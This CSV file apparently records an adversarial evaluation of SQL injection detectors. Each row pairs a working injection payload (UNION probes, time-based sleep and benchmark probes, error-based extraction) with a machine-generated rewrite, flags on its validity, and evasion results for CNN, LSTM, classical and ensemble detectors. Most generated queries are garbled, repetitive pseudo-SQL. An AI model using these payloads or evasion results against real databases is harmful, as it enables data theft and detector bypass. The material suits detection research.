original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--","SELECT MIN(6083,6083,6083,6083,6083--) FROM SQL injection AS t1 JOIN 6083,6083,6083,6083,6083-- FROM SQL_Injection AS t2 ON t1.6083 = t2.6083,6083,6083,6083-- FROM Query: -7111% union All select 6083,6083,6083,6083,6083,6083-- FROM SQL SELECT MIN(sql) FROM SELECT MIN(sql - Deleted FROM SELECT MIN(sql injection) FROM SELECT MIN(6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,6083,",1,1,0,1,0,0,0
"1%' union all select null,null#",SELECT MIN(null#) FROM SQL injection detection,1,0,1,1,1,1,1
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp","SELECT MIN(1210 = 1210,sleep ( 5 ) & 'yhpp' FROM SQL injection detection'",1,1,0,0,0,0,0
"1""   )    )    or sleep  (  5  )  #",SELECT MIN(5 ) FROM SQL injection detection,1,1,1,1,1,1,1
"1'   )    )    as pstn where 6691  =  6691 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SELECT DISTINCT pstn FROM SQL JOIN 6691 = 6691 AND 4241 = 'convert (int, (SELECT char( 113 ) FROM SQL injection)'",0,1,0,0,1,0,0
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",SELECT MIN(sleep ( 5 ) & (SELECT MIN(sleep) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
-2181'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'wyez'  =  'wyez,"SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(((SELECT, SUM(syst__chr ( 113 ) ORDER BY __chr ( chr ( )",0,1,0,0,1,0,0
"1'||  (  select 'pzto' from dual where 7338  =  7338 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'","SELECT MIN(sequence) FROM SQL injection detection WHERE NOT jQuery = 1'||"" AND NOT jdb$collations as t3,rdb$functions as t4 ) = ""sql injection""",1,1,0,0,0,0,0
"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --","SELECT MIN(SQL) FROM SQL Injection WHERE 2130 = 2130 AND make_set (7914 = 4032,4032)",1,1,0,0,0,0,0
"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",SELECT'sql injection detection' FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT SELECT 'lcza' FROM 5076 WHERE 5076 = 5076,1,1,1,1,1,1,1
1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM pg_sleep WHERE 6257 = 6257 OR 6793 = 6793,1,1,0,0,0,0,0
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#","SELECT MIN(sql injection) FROM SQL SELECT 8638,8638,8638,8638,8638,8638,8638,8638,8638 FROM SQL SELECT 8638,8638,8638,8638,8638,8638,8638,8638,8638 FROM SQL SELECT MIN(sql injection) FROM SELECT 8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,8638,86",1,1,1,0,0,0,0
"1'||  (  select 'kgfu' from dual where 2607  =  2607 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(sequence) FROM SQL injection detection WHERE 2607 = 2607 AND 3580 = (SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(SELECT SUM(CASE WHEN STRFTu) FROM SQL Query: 1'||) FROM dual WHERE 2607 = 2607 AND NOT domain.domain.tables = ""3580 = ""28"")",0,1,0,0,1,0,0
"1"" where 3329  =  3329 or sleep  (  5  )  --",SELECT MIN(SQL injection) FROM SQL SELECT SELECT MIN(3329 = 3329 OR sleep ( 5 ) FROM SQL injection detection),1,1,0,1,1,1,0
"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL injection'",1,1,0,0,1,0,0
"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",SELECT MIN(SQL) FROM SQL_Injection WHERE 3756 = 3756 OR 3756 = 3756 OR 7427 = dbms_pipe.receive_message (chr ( 87 ) ||chr ( 7427),1,1,0,0,0,0,0
"1"" where 1920  =  1920 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 1920 = 1920 AND 1920 = 1920 AND create_series (1,5000000 ) = 8635",1,1,0,0,0,0,0
select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,SELECT 9246 FROM mysql.db ) end  (SELECT 9246 FROM SQL AS _number) FROM SELECT 9246 FROM mysql.db ) AS _0 FROM SELECT 9246 FROM SELECT 9246 FROM mysql.db ) FROM SELECT 9246 FROM SELECT 9246 FROM mysql.db ) FROM NOT SELECT 9246 FROM SELECT SELECT MIN(SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT MIN((SELECT 9246 FROM mysql.db ) FROM 9246 WHERE NOT 9246 = 6326),1,1,0,1,1,1,0
1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,SELECT MIN(sequence) FROM SQL injection detection) AND 6240 = (SELECT SUM(qqpjq'||) FROM rdb$database ) ||'qzvzq'),1,1,0,0,0,0,0
"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa","SELECT MIN(3053 = 9778,9778 ) and ( (SELECT MIN(3053 = 9778,9778 ) FROM SQL injection detection) FROM SQL injection detection)",0,1,0,0,0,0,0
"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -6145'+ WHERE 1389 = 1389 = 1389 union All select 1389,1389,1389-- for",1,1,0,0,0,0,0
" end and    (    (     (  ""%""  =  """,SELECT * FROM query: end and ( (((((%) = %) FROM query: query: end and (((((%) = '%') AS t1 JOIN SQL injection = 'valid'),1,1,0,0,0,0,0
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM,1,1,1,0,1,1,0
"1%""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""%""  =  """,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT crypt_key ='sql injection',1,0,1,1,1,1,1
"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""ypoj""  =  ""ypoj","SELECT MIN(s) FROM SQL injection, COUNT(*) FROM SQL_injections WHERE NOT elt (3484 = 3484,1 - 1) AND (SELECT MIN(ypoj) FROM SQL injection)",0,1,0,0,1,0,0
"1%""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""%""  =  """,SELECT DISTINCT count ( * ) FROM SQL injection detection),1,0,1,1,1,1,1
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#","SELECT dntk FROM SQL JOIN 4780,4780,4780,4780,4780,4780,4780,4780,4780# FROM SQL SELECT dntk FROM Query: -9615 ) as dntk WHERE 4780 = 4780 = 4780 AND union all select 4780,4780,4780,4780,4780,4780,4780,4780,4780 = 4780,4780 = 4780",0,1,0,0,0,0,0
"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3990 = 3990 AND 8594 = (SELECT 8594 FROM pg_sleep ( 5 ),1,1,0,0,0,0,0
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,SELECT 6969 FROM pg_sleep ( 5 ) and 'dgvg = 'dgvg',0,1,0,0,0,0,0
"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE jpxj = 6153 OR 6156 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE 4860 = 4860 = 4860 OR 5356 = 4860 = 4860 ORDER BY sysusers as sys4,sysusers as sys4,sysusers as sys7",1,1,1,0,0,0,0
"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--","SELECT MIN(sql injection) FROM SQL SELECT MIN(null),null,null,null,null,null,null,null,null,null,null,null,null,null,null, null,null, null, null, null, null, null,null-- swich detection ='sq injection'",1,1,1,0,0,0,0
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#","SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -7981% union All select 4532,4532,4532,4532,4532,4532,4532,4532# FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) FROM SELECT 4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532,4532",1,1,0,0,0,0,0
"1""  )   where 8612  =  8612",SELECT MIN(8612 = 8612) FROM SQL injection detection,1,1,1,1,1,1,1
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1' where 1017  =  1017 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection WHERE 1017 = 1017 AND 7756 = 7756 = dbms_utility.sqlid_to_sqlhash ((SELECT MIN(sqlid_to_sqlhash)),1,1,0,0,0,0,0
-4947' order by 1#,SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
"1"" where 6023  =  6023",SELECT MIN(6023 = 6023) FROM SQL injection detection,1,1,1,1,1,1,1
"1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'","SELECT MIN(sequence) FROM SQL injection detection WHERE 4568 = 4568 OR 4568 = 4568 OR 7552 = (SELECT SUM(selection) FROM rdb$fields as t3,rdb$functions as t4 ) FROM SQL injection detection",1,1,0,0,0,0,0
"1%""   )    )     )   and 9198  =  9198--",SELECT MIN(exast_injection) FROM SQL SELECT MIN(exast_injection) FROM SQL SELECT MIN(excess_injection) FROM SQL_injection,1,1,1,1,1,1,1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,"SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT, COUNT(*) FROM dual ) AND STRFT ('sql - syst_searcher','sql injection') ='sql injection'",1,1,0,0,1,0,0
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",SELECT MIN(sql injection) FROM SQL injection - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(2853 = 2853) ||chr ( chr ( 2853 = 113),1,1,0,0,1,0,0
1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu","SELECT MIN(""eolu"") FROM SQL injection detection",1,0,1,0,1,1,0
"1'   )    )     )   union all select null,null,null--","SELECT null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM query: 1'",1,1,1,0,1,1,0
"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280","SELECT * FROM SQL AS _expired_sQ, MIN(_8280 = 8280) AND NOT ((8280 = 8280) FROM Query: 1 ) AND NOT md5 = '5000000,md5 ( 0x76555642 )'",1,1,0,0,0,0,0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null,null-- if FROM SQL injection detection)",1,1,1,0,0,0,0
"-7714 where 9768  =  9768 union all select 9768,9768--","SELECT MIN(sql injection) FROM SQL SELECT 9768 = 9768 -7714 WHERE NOT 9768 = 9768 - 9768 - for = ""sql injection detection""",1,1,1,0,0,0,0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL injection, SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3 FROM SELECT SELECT MIN(*) FROM SQL JOIN sysibm.systables as t2,sysibm.systables as t3 FROM sysibm.systables as t3 WHERE NOT SELECT - (SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM sysibm.systables as t3 FROM sysibm.systables as t3 FROM SQL injection) ORDER BY t1.sysibm.systables as t3",0,1,0,0,0,0,0
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,"SELECT * FROM SQL AS _expired_placer, MIN(*) FROM uadn WHERE NOT uadn = 9588 AND NOT uadn = 9588 AND NOT uadn = 9588 ORDER BY uadn",1,1,1,1,1,1,1
1  )   as wiyx where 6515  =  6515,SELECT * FROM Query: 1 ) as wiyx WHERE NOT SQL_injection = 6515 AND NOT SQL_injection = 6515,1,1,1,0,0,0,0
"-3433'  )   where 8307  =  8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--","SELECT MIN(sql injection) FROM SQL SELECT 8307,8307,8307,8307,8307,8307,8307,8307-- FROM SQL SELECT 8307, 8307 FROM 8307, 8307,8307,8307,8307,8307,8307,8307-- FROM SQL SELECT 8307, 8307,8307,8307,8307,8307,8307,8307,8307 = 8307 = 8307,8307,8307 = 8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307,8307 = 8307 AS _3433'",1,1,1,1,0,1,0
-3960' or 9323  =  9323#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -3960' OR 9323 = 9323#,1,1,0,0,1,0,0
"-4427'   )    )    union all select 6357,6357,6357,6357,6357#",SELECT MIN(sql injection) FROM SQL -4427',0,0,1,1,1,1,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,SELECT MIN(4968 = 4968) FROM SQL injection detection,1,0,0,1,1,1,0
"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",SELECT MIN(sql) FROM SQL injection detection),1,0,1,1,1,1,1
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT FROM SELECT SUM(swich) FROM SQL SELECT SUM(swift_induced) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SELECT SUM(null) FROM SQL SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL - SELECT SUM(null) FROM SQL,1,1,1,0,1,1,0
"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#","SELECT -7088'|| FROM SQL SELECT SELECT -7088,8891 FROM SQL SELECT -7088,8891 FROM SQL SELECT -7088,8891 FROM 8891 WHERE NOT 8891 = 8891 = 8891 ORDER BY 8891",0,1,0,1,0,0,0
1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,SELECT MIN(8023 = 8023) FROM SQL injection detection,1,1,0,1,1,1,0
"1"" where 4672  =  4672",SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1 WHERE 4672 = 4672,1,1,1,1,1,1,1
"1"" and make_set  (  8262  =  3471,3471  )   and ""wayp""  =  ""wayp",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series",1,1,0,0,1,0,0
"1%""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,SELECT MIN(s) FROM SQL injection_description) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM SQL - SELECT MIN(s) FROM (SELECT MIN(s) FROM SQL),1,1,0,0,1,0,0
"1""   )    )     )   union all select null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL - SELECT MIN(null) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(sql) FROM SQL SELECT MIN(null) FROM SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT SELECT MIN(null) FROM SQL SELECT",1,1,1,0,1,1,0
